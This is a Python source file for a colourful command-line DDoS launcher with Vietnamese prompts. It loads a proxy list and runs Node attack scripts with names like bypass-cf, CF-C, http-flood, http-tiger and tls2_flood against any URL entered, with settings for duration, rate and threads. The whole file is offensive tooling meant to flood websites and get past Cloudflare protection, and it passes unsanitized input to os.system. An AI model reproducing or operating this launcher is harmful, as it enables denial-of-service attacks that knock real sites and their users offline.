# -*- coding: utf-8 -*-
from multiprocessing.connection import wait
import socket
import os
import random
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def title():
    clear()
    time.sleep(0.03)   
    print(f'''
             \x1b[38;2;255;165;0m╔\x1b[38;2;0;255;255m─────────────────────────\x1b[38;2;255;165;0m─\x1b[38;2;255;20;147m─────────────────────────\x1b[38;2;255;165;0m╗
             \x1b[38;2;0;255;255m│     \x1b[38;2;0;255;255m╔╦╗┌─┐┌┬┐┬ ┬┌─┐┌┬┐┌─┐ \x1b[38;2;255;20;147m ╔═╗┌┬┐┌┬┐┌─┐┌─┐┬┌─     │
             \x1b[38;2;0;255;255m│     \x1b[38;2;0;255;255m║║║├┤  │ ├─┤│ │ ││└─┐ \x1b[38;2;255;20;147m ╠═╣ │  │ ├─┤│  ├┴┐     │
             \x1b[38;2;0;255;255m│     \x1b[38;2;0;255;255m╩ ╩└─┘ ┴ ┴ ┴└─┘─┴┘└─┘ \x1b[38;2;255;20;147m ╩ ╩ ┴  ┴ ┴ ┴└─┘┴ ┴     │
             \x1b[38;2;255;165;0m╚\x1b[38;2;0;255;255m──────────────────\x1b[38;2;255;165;0m╦\x1b[38;2;0;255;255m──────\x1b[38;2;255;165;0m─\x1b[38;2;255;20;147m─────\x1b[38;2;255;165;0m╦\x1b[38;2;255;20;147m───────────────────\x1b[38;2;255;165;0m╝
                         \x1b[38;2;255;165;0m╔\x1b[38;2;0;255;255m──────\x1b[38;2;255;165;0m╩\x1b[38;2;0;255;255m──────\x1b[38;2;255;165;0m╦\x1b[38;2;255;20;147m─────\x1b[38;2;255;165;0m╩\x1b[38;2;255;20;147m───────\x1b[38;2;255;165;0m╗
                         \x1b[38;2;0;255;255m│\x1b[38;2;255;0;0m http-tiger  \x1b[38;2;0;255;255m│  \x1b[38;2;255;0;0mbypass-cf  \x1b[38;2;255;20;147m│ 
                         \x1b[38;2;0;255;255m│\x1b[38;2;255;0;0m    CF-C     \x1b[38;2;255;20;147m│  \x1b[38;2;255;0;0mMethod-2   \x1b[38;2;255;20;147m│
                         \x1b[38;2;255;165;0m╚╗\x1b[38;2;0;255;255m────────────\x1b[38;2;255;165;0m╩\x1b[38;2;255;20;147m────────────\x1b[38;2;255;165;0m╔╝
                   \x1b[38;2;255;165;0m╔\x1b[38;2;0;255;255m──────\x1b[38;2;255;165;0m╩\x1b[38;2;0;255;255m─────\x1b[38;2;255;165;0m╦\x1b[38;2;0;255;255m──────\x1b[38;2;255;165;0m╦\x1b[38;2;255;20;147m──────\x1b[38;2;255;165;0m╦─────\x1b[38;2;255;165;0m╩\x1b[38;2;255;20;147m──────\x1b[38;2;255;165;0m╗
                   \x1b[38;2;0;255;255m│\x1b[38;2;255;0;0m  Method-1  \x1b[38;2;0;255;255m│RAW   \x1b[38;2;255;165;0m│  RAND\x1b[38;2;255;20;147m│ \x1b[38;2;255;0;0mtls2_flood \x1b[38;2;255;20;147m│ 
                   \x1b[38;2;255;165;0m╚╗\x1b[38;2;0;255;255m───────────\x1b[38;2;255;165;0m╩\x1b[38;2;0;255;255m─────╔\x1b[38;2;255;165;0m╩\x1b[38;2;255;20;147m╗─────\x1b[38;2;255;165;0m╩\x1b[38;2;255;20;147m───────────\x1b[38;2;255;165;0m╔╝
                    \x1b[38;2;0;255;255m├───http-\x1b[38;2;255;20;147mflood\x1b[38;2;0;255;255m────\x1b[38;2;0;255;255m┤ \x1b[38;2;255;20;147m├───http-\x1b[38;2;0;255;255msocket\x1b[38;2;255;20;147m───\x1b[38;2;255;20;147m┤
                    \x1b[38;2;255;165;0m╚─────────────────\x1b[38;2;0;255;255m╩\x1b[38;2;255;165;0m─\x1b[38;2;255;20;147m╩─────────────────\x1b[38;2;255;165;0m╝
''')

def main():
    title()
    while True:
        print("\x1b[38;2;255;165;0m╔\x1b[38;2;0;255;255m──────────────────────────────────────\x1b[38;2;255;20;147m──────────────────────────────────────\x1b[38;2;255;165;0m╗")
        cnc = input('''\x1b[38;2;0;255;255m│Chọn Methods Attack:\x1b[38;2;255;20;147m''')
        print("\x1b[38;2;255;165;0m╚\x1b[38;2;0;255;255m──────────────────────────────────────\x1b[38;2;255;20;147m──────────────────────────────────────\x1b[38;2;255;165;0m╝")
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        if cnc == "methods" or cnc == "METHODS" or cnc == "MS" or cnc == "ms":
            methods()
        elif "RAW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node RAW.js {url} {time}')
            except IndexError:
                print('Cách sử dụng: RAW <url> <time>')
                print('Ví dụ: RAW http://example.com 60')
                
        elif "bypass-cf" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                rate = cnc.split()[4]
                os.system(f'node bypass-cf.js {url} {time} {threads} {rate}')
            except IndexError:
                print('Cách sử dụng: bypass-cf <url> <time> <threads> <rate>')
                print('Ví dụ: bypass-cf http://example.com 60 5 10')

        elif "Method-1" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node Method-1.js {url} {time} {rate} {threads} proxies.txt')
            except IndexError:
                print('Cách sử dụng: Method-1 <url> <time> <rate> <threads>')
                print('Ví dụ: Method-1 http://example.com 60 10 5')
                
        elif "CF-C" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node CF-C.js {url} {time} {rate} {threads} proxies.txt')
            except IndexError:
                print('Cách sử dụng: CF-C <url> <time> <rate> <threads>')
                print('Ví dụ: CF-C http://example.com 60 10 5')

        elif "Method-2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node Method-2.js {url} {time} {rate} {threads} proxies.txt')
            except IndexError:
                print('Cách sử dụng: Method-2 <url> <time> <rate> <threads>')
                print('Ví dụ: Methods-2 http://example.com 60 10 5')
               
        elif "RAND" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node RAND.js {url} {time}')
            except IndexError:
                print('Cách sử dụng: RAND <url> <time>')
                print('Ví dụ: RAND http://example.com 60')

        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node http-socket.js {url} {threads} {time}')
            except IndexError:
                print('Cách sử dụng: http-socket <url> <threads> <time>')
                print('Ví dụ: http-socket http://example.com 5 60')
                
        elif "http-flood" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node http-flood.js {url} {time}')
            except IndexError:
                print('Cách sử dụng: http-flood <url> <time>')
                print('Ví dụ: http-flood http://example.com 60')
                
        elif "http-tiger" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node http-tiger.js {url} {time} {rate} proxies.txt {threads}')
            except IndexError:
                print('Cách sử dụng: http-tiger <url> <time> <ConnectPerThread> <threads>')
                print('Ví dụ: http-tiger <http://example.com> <60> <250> <10>')
                
        elif "tls2_flood" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node tls2_flood GET {url} proxies.txt {time} 1000 {threads}')
            except IndexError:
                print('Cách sử dụng: tls2_flood <url> <time> <threads>')
                print('Ví dụ: tls2_flood http://example.com 120 5')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

def login():
    main()

login()
